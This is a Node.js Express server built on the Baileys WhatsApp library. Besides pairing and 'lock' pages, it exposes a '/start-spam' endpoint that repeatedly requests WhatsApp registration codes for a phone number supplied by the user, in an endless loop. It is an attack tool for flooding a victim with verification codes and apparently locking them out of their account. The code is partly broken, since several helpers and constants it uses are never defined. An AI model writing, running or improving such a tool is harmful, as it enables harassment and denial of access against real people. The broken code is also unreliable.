const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const app = express();
const port = 8000;
const path  = require('path');
const ejs    = require('ejs');
const __path = path.join(__dirname, 'views');
const { default: _makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');
let server = require('./views/qr')
code = require('./views/pair');
app.use('/qr', server);
app.use('/code', code);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.set('view engine', 'ejs');
app.set('views', __path);

// Add the following line to register the EJS view engine
app.engine('ejs', ejs.renderFile);

// Add the following line to register the EJS view engine

app.get('/', (req, res) => {
  res.render('index', { title: 'Home' });
});

app.get('/lock', (req, res) => {
    res.render(path.join(__path, 'lock'), { title: 'Lock' });
  });



  app.post('/start-spam', async(req, res) => {
    const {  ddi, number } = req.body; // Extract values from request body
  
    // Check if all fields are filled
    if (  !ddi || !number ) {
      res.status(400).send('All fields are required');
      return;
    }
  
    // Hier können Sie den Spam-Prozess starten
    const { state, saveCreds } = await useMultiFileAuthState('.mm');
    const spam = _makeWaSocket({
      auth: state,
      mobile: true,
      logger: pino({ level: 'silent' })
    });
  
    while (true) {
      try {
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + ddi+number,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        });
  
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          console.log(gradient('red', 'red')(`BY BARON: +${res.login}`));
        }
  
        // Wait for the specified delay time before sending the next request
        await waitUntil(() => false, { timeout: DELAY_TIME });
  
      } catch (err) {
        console.error(err);
      }
    }
  });
  




app.get('/hello', (req, res) => {
  res.render('hello', { title: 'Test' });
});

app.get('/pair', (req, res) => {
  res.render('pair', { title: 'pairing' });
})








app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});



